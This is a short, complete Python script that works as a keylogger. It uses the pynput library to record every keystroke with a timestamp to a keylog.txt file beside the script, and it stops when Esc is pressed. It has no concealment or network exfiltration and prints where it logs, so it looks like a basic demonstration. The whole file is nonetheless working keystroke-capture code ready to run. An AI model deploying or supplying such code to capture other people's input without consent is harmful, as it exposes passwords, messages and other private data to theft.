from pynput import keyboard
import os
import datetime

# Path to log file (same directory as script)
log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")

# Write keystroke to log file
def write_log(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        try:
            f.write(f"{timestamp} - {key.char}\n")
        except AttributeError:
            f.write(f"{timestamp} - [{key}]\n")

# Listener functions
def on_press(key):
    write_log(key)

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop logging when ESC is pressed

# Start keylogger
def main():
    print(f"Logging keystrokes to: {log_file}")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
